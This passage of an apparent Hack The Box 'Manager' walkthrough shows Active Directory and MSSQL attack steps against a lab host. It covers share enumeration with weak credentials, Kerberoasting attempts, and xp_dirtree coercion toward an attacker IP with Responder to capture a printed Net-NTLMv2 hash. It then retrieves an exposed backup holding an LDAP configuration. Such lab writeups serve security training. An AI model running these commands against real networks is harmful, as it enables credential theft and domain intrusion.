+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">operator</span><span class="p">:</span><span class="n">operator</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enumerated</span> <span class="n">shares</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">Share</span>           <span class="n">Permissions</span>     <span class="n">Remark</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="o">-----</span>           <span class="o">-----------</span>     <span class="o">------</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">ADMIN</span><span class="err">$</span>                          <span class="n">Remote</span> <span class="n">Admin</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">C</span><span class="err">$</span>                              <span class="n">Default</span> <span class="n">share</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">IPC</span><span class="err">$</span>            <span class="n">READ</span>            <span class="n">Remote</span> <span class="n">IPC</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">NETLOGON</span>        <span class="n">READ</span>            <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span> 
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">SYSVOL</span>          <span class="n">READ</span>            <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span>
+</pre></div>
+<p>There aren't any noteworthy shared resources. Occasionally, you might find interesting information in the <code>SYSVOL</code> resource, but that's not the case with this machine.</p><br/>
+<p>Let's verify if the user <code>operator</code> belongs to the <code>Remote Management Users</code> group. If so, we could potentially gain access to the system using tools like <code>Evil-WinRM</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">winrm</span> <span class="mf">10.10.11.236</span> <span class="o">-</span><span class="n">u</span> <span class="n">operator</span> <span class="o">-</span><span class="n">p</span> <span class="n">operator</span>
+<span class="n">SMB</span>         <span class="mf">10.10.11.236</span>    <span class="mi">5985</span>   <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span>
+<span class="n">HTTP</span>        <span class="mf">10.10.11.236</span>    <span class="mi">5985</span>   <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.236</span><span class="p">:</span><span class="mi">5985</span><span class="o">/</span><span class="n">wsman</span>
+<span class="n">HTTP</span>        <span class="mf">10.10.11.236</span>    <span class="mi">5985</span>   <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span>\<span class="n">operator</span><span class="p">:</span><span class="n">operator</span>
+</pre></div>
+<p>Unfortunately, attempting WinRM access was unsuccessful. Therefore, there are no further actions to take through WinRM at this point.</p><br/>
+<p>As we possess valid credentials, we can proceed with a Kerberoasting Attack. If successful, we may obtain valid credentials for vulnerable users. To execute this, we'll utilize <code>GetUserSPNs.py</code> from the <a href="https://github.com/fortra/impacket">Impacket</a> suite.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">GetUserSPNs</span><span class="o">.</span><span class="n">py</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">operator</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.11.236</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span><span class="o">.</span><span class="n">dev1</span><span class="o">+</span><span class="mf">20230909.154612.3</span><span class="n">beeda7</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>
+
+<span class="n">Password</span><span class="p">:</span>
+<span class="n">No</span> <span class="n">entries</span> <span class="n">found</span><span class="err">!</span>
+</pre></div>
+<p>There are no users vulnerable to Kerberoasting, so we will continue using the same credentials at this point.</p><br/>
+<h3>Shell as raven</h3><br/>
+<p>As we saw during the initial port scan, port <code>1433</code> was open. This port corresponds to the MSSQL Service. Perhaps our credentials will enable us to gain access to this service.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">mssqlclient</span><span class="o">.</span><span class="n">py</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">operator</span><span class="p">:</span><span class="n">operator</span><span class="o">@</span><span class="mf">10.10.11.236</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span><span class="o">.</span><span class="n">dev1</span><span class="o">+</span><span class="mf">20230909.154612.3</span><span class="n">beeda7</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Encryption</span> <span class="n">required</span><span class="p">,</span> <span class="n">switching</span> <span class="n">to</span> <span class="n">TLS</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">ERROR</span><span class="p">(</span><span class="n">DC01</span>\<span class="n">SQLEXPRESS</span><span class="p">):</span> <span class="n">Line</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Login</span> <span class="n">failed</span> <span class="k">for</span> <span class="n">user</span> <span class="s1">'operator'</span><span class="o">.</span>
+</pre></div>
+<p>At first glance, it didn't work. Let's see what happens if we specify the <code>-windows-auth</code> parameter:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">mssqlclient</span><span class="o">.</span><span class="n">py</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">operator</span><span class="p">:</span><span class="n">operator</span><span class="o">@</span><span class="mf">10.10.11.236</span> <span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="n">auth</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span><span class="o">.</span><span class="n">dev1</span><span class="o">+</span><span class="mf">20230909.154612.3</span><span class="n">beeda7</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Encryption</span> <span class="n">required</span><span class="p">,</span> <span class="n">switching</span> <span class="n">to</span> <span class="n">TLS</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">DATABASE</span><span class="p">):</span> <span class="n">Old</span> <span class="n">Value</span><span class="p">:</span> <span class="n">master</span><span class="p">,</span> <span class="n">New</span> <span class="n">Value</span><span class="p">:</span> <span class="n">master</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">LANGUAGE</span><span class="p">):</span> <span class="n">Old</span> <span class="n">Value</span><span class="p">:</span> <span class="p">,</span> <span class="n">New</span> <span class="n">Value</span><span class="p">:</span> <span class="n">us_english</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">PACKETSIZE</span><span class="p">):</span> <span class="n">Old</span> <span class="n">Value</span><span class="p">:</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">New</span> <span class="n">Value</span><span class="p">:</span> <span class="mi">16192</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">INFO</span><span class="p">(</span><span class="n">DC01</span>\<span class="n">SQLEXPRESS</span><span class="p">):</span> <span class="n">Line</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Changed</span> <span class="n">database</span> <span class="n">context</span> <span class="n">to</span> <span class="s1">'master'</span><span class="o">.</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">INFO</span><span class="p">(</span><span class="n">DC01</span>\<span class="n">SQLEXPRESS</span><span class="p">):</span> <span class="n">Line</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Changed</span> <span class="n">language</span> <span class="n">setting</span> <span class="n">to</span> <span class="n">us_english</span><span class="o">.</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ACK</span><span class="p">:</span> <span class="n">Result</span><span class="p">:</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="p">(</span><span class="mi">150</span> <span class="mi">7208</span><span class="p">)</span> 
+<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
+<span class="n">SQL</span> <span class="p">(</span><span class="n">MANAGER</span>\<span class="n">Operator</span>  <span class="n">guest</span><span class="nd">@master</span><span class="p">)</span><span class="o">&gt;</span>
+</pre></div>
+<p>Great! We gained access to the MSSQL Service.</p><br/>
+<p>During the enumeration of the MSSQL Service, I didn't find any useful information. However, I noticed that the <code>xp_dirtree</code> command was available, so I thought about some attacks. </p><br/>
+<p>The <code>xp_dirtree</code> command allows users to explore and list directories and files on the server's file system. This command can be useful for tasks such as file system navigation and management within SQL Server environments.</p><br/>
+<p>In addition to scanning the server's file system, you can attempt to list network-level shares. This essentially means that you could perform network-level authentication against a share, potentially leaking a Net-NTLMv2 hash.</p><br/>
+<p>To capture this network-level authentication, I will use the <a href="https://github.com/lgandx/Responder">Responder</a> poisoner.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">Responder</span><span class="o">/</span><span class="n">Responder</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">I</span> <span class="n">tun0</span> <span class="o">-</span><span class="n">v</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">Responder</span><span class="o">/</span><span class="n">Responder</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">I</span> <span class="n">tun0</span> <span class="o">-</span><span class="n">v</span>
+
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Poisoners</span><span class="p">:</span>
+    <span class="n">LLMNR</span>                      <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
+    <span class="n">NBT</span><span class="o">-</span><span class="n">NS</span>                     <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
+    <span class="n">MDNS</span>                       <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
+    <span class="n">DNS</span>                        <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
+    <span class="n">DHCP</span>                       <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Servers</span><span class="p">:</span>
+    <span class="n">HTTP</span> <span class="n">server</span>                <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
+    <span class="n">HTTPS</span> <span class="n">server</span>               <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
+    <span class="n">WPAD</span> <span class="n">proxy</span>                 <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>
+    <span class="n">Auth</span> <span class="n">proxy</span>                 <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>
+    <span class="n">SMB</span> <span class="n">server</span>                 <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
+    <span class="n">Kerberos</span> <span class="n">server</span>            <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
+    <span class="n">SQL</span> <span class="n">server</span>                 <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Current</span> <span class="n">Session</span> <span class="n">Variables</span><span class="p">:</span>
+    <span class="n">Responder</span> <span class="n">Machine</span> <span class="n">Name</span>     <span class="p">[</span><span class="n">WIN</span><span class="o">-</span><span class="n">L48LHKM1C40</span><span class="p">]</span>
+    <span class="n">Responder</span> <span class="n">Domain</span> <span class="n">Name</span>      <span class="p">[</span><span class="mf">0991.</span><span class="n">LOCAL</span><span class="p">]</span>
+    <span class="n">Responder</span> <span class="n">DCE</span><span class="o">-</span><span class="n">RPC</span> <span class="n">Port</span>     <span class="p">[</span><span class="mi">47505</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Listening</span> <span class="k">for</span> <span class="n">events</span><span class="o">...</span>
+</pre></div>
+<p>Next, we will utilize <code>xp_dirtree</code> to initiate a network-level authentication.</p><br/>
+<div class="highlight"><pre><span></span><span class="n">SQL</span> <span class="p">(</span><span class="n">MANAGER</span>\<span class="n">Operator</span>  <span class="n">guest</span><span class="nd">@master</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">xp_dirtree</span> \\<span class="mf">10.10.16.2</span>\<span class="n">a</span>
+<span class="n">subdirectory</span>   <span class="n">depth</span>   <span class="n">file</span>   
+<span class="o">------------</span>   <span class="o">-----</span>   <span class="o">----</span>   
+<span class="n">SQL</span> <span class="p">(</span><span class="n">MANAGER</span>\<span class="n">Operator</span>  <span class="n">guest</span><span class="nd">@master</span><span class="p">)</span><span class="o">&gt;</span>
+</pre></div>
+<p>We successfully obtained the <code>Net-NTLMv2</code> hash:</p><br/>
+<div class="highlight"><pre><span></span><span class="p">[</span><span class="n">SMB</span><span class="p">]</span> <span class="n">NTLMv2</span><span class="o">-</span><span class="n">SSP</span> <span class="n">Client</span>   <span class="p">:</span> <span class="mf">10.10.11.236</span>
+<span class="p">[</span><span class="n">SMB</span><span class="p">]</span> <span class="n">NTLMv2</span><span class="o">-</span><span class="n">SSP</span> <span class="n">Username</span> <span class="p">:</span> <span class="n">MANAGER</span>\<span class="n">DC01</span><span class="err">$</span>
+<span class="p">[</span><span class="n">SMB</span><span class="p">]</span> <span class="n">NTLMv2</span><span class="o">-</span><span class="n">SSP</span> <span class="n">Hash</span>     <span class="p">:</span> <span class="n">DC01</span><span class="err">$</span><span class="p">::</span><span class="n">MANAGER</span><span class="p">:</span><span class="mi">86</span><span class="n">cf6e7938fec1bb</span><span class="p">:</span><span class="mi">84</span><span class="n">AB0990D1CF3E4E12197367DB5AC620</span><span class="p">:</span><span class="mi">0101000000000000803540</span><span class="n">BD9274DA01253208077D4D230A0000000002000800300039003900310001001E00570049004E002D004C00340038004C0048004B004D00310043003400300004003400570049004E002D004C00340038004C0048004B004D0031004300340030002E0030003900390031002E004C004F00430041004C000300140030003900390031002E004C004F00430041004C000500140030003900390031002E004C004F00430041004C0007000800803540BD9274DA0106000400020000000800300030000000000000000000000000300000BE1467459C7019954C2A28FDD4C4F683F9DD2AA7BA11D950819CCCCBB070B8750A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0032000000000000000000</span>
+</pre></div>
+<p>Unfortunately, this hash proved to be uncrackable, rendering it useless at this point. Although we can't abuse <code>xp_dirtree</code> to obtain credentials, it may still enable us to list the server's file system.</p><br/>
+<p>Let's attempt to list the directories in the system root:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">SQL</span> <span class="p">(</span><span class="n">MANAGER</span>\<span class="n">Operator</span>  <span class="n">guest</span><span class="nd">@master</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">EXEC</span> <span class="n">xp_dirtree</span> <span class="s2">"C:</span><span class="se">\"</span><span class="s2">,1,1</span>
+<span class="n">subdirectory</span>                <span class="n">depth</span>   <span class="n">file</span>   
+<span class="o">-------------------------</span>   <span class="o">-----</span>   <span class="o">----</span>   
+<span class="err">$</span><span class="n">Recycle</span><span class="o">.</span><span class="n">Bin</span>                    <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">Documents</span> <span class="ow">and</span> <span class="n">Settings</span>          <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">inetpub</span>                         <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">PerfLogs</span>                        <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">Program</span> <span class="n">Files</span>                   <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">Program</span> <span class="n">Files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)</span>             <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">ProgramData</span>                     <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">Recovery</span>                        <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">SQL2019</span>                         <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">System</span> <span class="n">Volume</span> <span class="n">Information</span>       <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">Users</span>                           <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">Windows</span>                         <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">SQL</span> <span class="p">(</span><span class="n">MANAGER</span>\<span class="n">Operator</span>  <span class="n">guest</span><span class="nd">@master</span><span class="p">)</span><span class="o">&gt;</span>
+</pre></div>
+<p>Indeed, we have successfully obtained directory listing over the filesystem. </p><br/>
+<p>While enumerating the filesystem, I discovered the root folder of the website exposed on port 80:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">SQL</span> <span class="p">(</span><span class="n">MANAGER</span>\<span class="n">Operator</span>  <span class="n">guest</span><span class="nd">@master</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">EXEC</span> <span class="n">xp_dirtree</span> <span class="s2">"C:\inetpub\wwwroot"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span>
+<span class="n">subdirectory</span>                      <span class="n">depth</span>   <span class="n">file</span>   
+<span class="o">-------------------------------</span>   <span class="o">-----</span>   <span class="o">----</span>   
+<span class="n">about</span><span class="o">.</span><span class="n">html</span>                            <span class="mi">1</span>      <span class="mi">1</span>   
+
+<span class="n">contact</span><span class="o">.</span><span class="n">html</span>                          <span class="mi">1</span>      <span class="mi">1</span>   
+
+<span class="n">css</span>                                   <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">images</span>                                <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">index</span><span class="o">.</span><span class="n">html</span>                            <span class="mi">1</span>      <span class="mi">1</span>   
+
+<span class="n">js</span>                                    <span class="mi">1</span>      <span class="mi">0</span>   
+
+<span class="n">service</span><span class="o">.</span><span class="n">html</span>                          <span class="mi">1</span>      <span class="mi">1</span>   
+
+<span class="n">web</span><span class="o">.</span><span class="n">config</span>                            <span class="mi">1</span>      <span class="mi">1</span>   
+
+<span class="n">website</span><span class="o">-</span><span class="n">backup</span><span class="o">-</span><span class="mi">27</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">23</span><span class="o">-</span><span class="n">old</span><span class="o">.</span><span class="n">zip</span>       <span class="mi">1</span>      <span class="mi">1</span>   
+
+<span class="n">SQL</span> <span class="p">(</span><span class="n">MANAGER</span>\<span class="n">Operator</span>  <span class="n">guest</span><span class="nd">@master</span><span class="p">)</span><span class="o">&gt;</span>
+</pre></div>
+<p>This is quite intriguing. As you may have noticed, there is a compressed file in the root folder with the word <code>backup</code> in its name. Let's take a closer look at it.</p><br/>
+<p>Since it's exposed in the root folder of the website, we can attempt to download it using <code>wget</code>.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.236</span><span class="o">/</span><span class="n">website</span><span class="o">-</span><span class="n">backup</span><span class="o">-</span><span class="mi">27</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">23</span><span class="o">-</span><span class="n">old</span><span class="o">.</span><span class="n">zip</span>
+<span class="o">--</span><span class="mi">2024</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">13</span> <span class="mi">07</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">32</span><span class="o">--</span>  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.236</span><span class="o">/</span><span class="n">website</span><span class="o">-</span><span class="n">backup</span><span class="o">-</span><span class="mi">27</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">23</span><span class="o">-</span><span class="n">old</span><span class="o">.</span><span class="n">zip</span>
+<span class="n">Connecting</span> <span class="n">to</span> <span class="mf">10.10.11.236</span><span class="p">:</span><span class="mf">80.</span><span class="o">..</span> <span class="n">connected</span><span class="o">.</span>
+<span class="n">HTTP</span> <span class="n">request</span> <span class="n">sent</span><span class="p">,</span> <span class="n">awaiting</span> <span class="n">response</span><span class="o">...</span> <span class="mi">200</span> <span class="n">OK</span>
+<span class="n">Length</span><span class="p">:</span> <span class="mi">1045328</span> <span class="p">(</span><span class="mi">1021</span><span class="n">K</span><span class="p">)</span> <span class="p">[</span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="nb">zip</span><span class="o">-</span><span class="n">compressed</span><span class="p">]</span>
+<span class="n">Saving</span> <span class="n">to</span><span class="p">:</span> <span class="err">‘</span><span class="n">website</span><span class="o">-</span><span class="n">backup</span><span class="o">-</span><span class="mi">27</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">23</span><span class="o">-</span><span class="n">old</span><span class="o">.</span><span class="n">zip</span><span class="err">’</span>
+
+<span class="n">website</span><span class="o">-</span><span class="n">backup</span><span class="o">-</span><span class="mi">27</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">23</span><span class="o">-</span><span class="n">old</span><span class="o">.</span><span class="n">zip</span>  <span class="mi">100</span><span class="o">%</span><span class="p">[</span><span class="o">=======================================================&gt;</span><span class="p">]</span>   <span class="mi">1021</span><span class="n">K</span>   <span class="mi">315</span><span class="n">KB</span><span class="o">/</span><span class="n">s</span>    <span class="ow">in</span> <span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="n">s</span>    
+
+<span class="mi">2024</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">13</span> <span class="mi">07</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">36</span> <span class="p">(</span><span class="mi">315</span> <span class="n">KB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span> <span class="o">-</span> <span class="err">‘</span><span class="n">website</span><span class="o">-</span><span class="n">backup</span><span class="o">-</span><span class="mi">27</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">23</span><span class="o">-</span><span class="n">old</span><span class="o">.</span><span class="n">zip</span><span class="err">’</span> <span class="n">saved</span> <span class="p">[</span><span class="mi">1045328</span><span class="o">/</span><span class="mi">1045328</span><span class="p">]</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>Once downloaded, I'll extract it using <code>unzip</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">unzip</span> <span class="o">-</span><span class="n">d</span> <span class="n">backup</span> <span class="n">website</span><span class="o">-</span><span class="n">backup</span><span class="o">-</span><span class="mi">27</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">23</span><span class="o">-</span><span class="n">old</span><span class="o">.</span><span class="n">zip</span>
+<span class="n">Archive</span><span class="p">:</span>  <span class="n">website</span><span class="o">-</span><span class="n">backup</span><span class="o">-</span><span class="mi">27</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">23</span><span class="o">-</span><span class="n">old</span><span class="o">.</span><span class="n">zip</span>
+  <span class="n">inflating</span><span class="p">:</span> <span class="n">backup</span><span class="o">/.</span><span class="n">old</span><span class="o">-</span><span class="n">conf</span><span class="o">.</span><span class="n">xml</span>    
+  <span class="n">inflating</span><span class="p">:</span> <span class="n">backup</span><span class="o">/</span><span class="n">about</span><span class="o">.</span><span class="n">html</span>       
+  <span class="n">inflating</span><span class="p">:</span> <span class="n">backup</span><span class="o">/</span><span class="n">contact</span><span class="o">.</span><span class="n">html</span>     
+  <span class="n">inflating</span><span class="p">:</span> <span class="n">backup</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">css</span>  
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+ <span class="n">extracting</span><span class="p">:</span> <span class="n">backup</span><span class="o">/</span><span class="n">images</span><span class="o">/</span><span class="n">s</span><span class="o">-</span><span class="mf">4.</span><span class="n">png</span>   
+ <span class="n">extracting</span><span class="p">:</span> <span class="n">backup</span><span class="o">/</span><span class="n">images</span><span class="o">/</span><span class="n">search</span><span class="o">-</span><span class="n">icon</span><span class="o">.</span><span class="n">png</span>  
+  <span class="n">inflating</span><span class="p">:</span> <span class="n">backup</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">html</span>       
+  <span class="n">inflating</span><span class="p">:</span> <span class="n">backup</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">js</span>  
+  <span class="n">inflating</span><span class="p">:</span> <span class="n">backup</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">jquery</span><span class="o">-</span><span class="mf">3.4.1</span><span class="o">.</span><span class="n">min</span><span class="o">.</span><span class="n">js</span>  
+  <span class="n">inflating</span><span class="p">:</span> <span class="n">backup</span><span class="o">/</span><span class="n">service</span><span class="o">.</span><span class="n">html</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>Upon examining the files, I found the <code>.old-conf.xml</code> file intriguing. Upon inspecting its contents, I discovered the following:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="o">.</span><span class="n">old</span><span class="o">-</span><span class="n">conf</span><span class="o">.</span><span class="n">xml</span>
+<span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="err">?</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">ldap</span><span class="o">-</span><span class="n">conf</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span><span class="o">&gt;</span>
+   <span class="o">&lt;</span><span class="n">server</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="n">host</span><span class="o">&gt;</span><span class="n">dc01</span><span class="o">.</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="o">&lt;/</span><span class="n">host</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="nb">open</span><span class="o">-</span><span class="n">port</span> <span class="n">enabled</span><span class="o">=</span><span class="s2">"true"</span><span class="o">&gt;</span><span class="mi">389</span><span class="o">&lt;/</span><span class="nb">open</span><span class="o">-</span><span class="n">port</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="n">secure</span><span class="o">-</span><span class="n">port</span> <span class="n">enabled</span><span class="o">=</span><span class="s2">"false"</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&lt;/</span><span class="n">secure</span><span class="o">-</span><span class="n">port</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="n">search</span><span class="o">-</span><span class="n">base</span><span class="o">&gt;</span><span class="n">dc</span><span class="o">=</span><span class="n">manager</span><span class="p">,</span><span class="n">dc</span><span class="o">=</span><span class="n">htb</span><span class="o">&lt;/</span><span class="n">search</span><span class="o">-</span><span class="n">base</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="n">server</span><span class="o">-</span><span class="nb">type</span><span class="o">&gt;</span><span class="n">microsoft</span><span class="o">&lt;/</span><span class="n">server</span><span class="o">-</span><span class="nb">type</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="n">access</span><span class="o">-</span><span class="n">user</span><span class="o">&gt;</span>
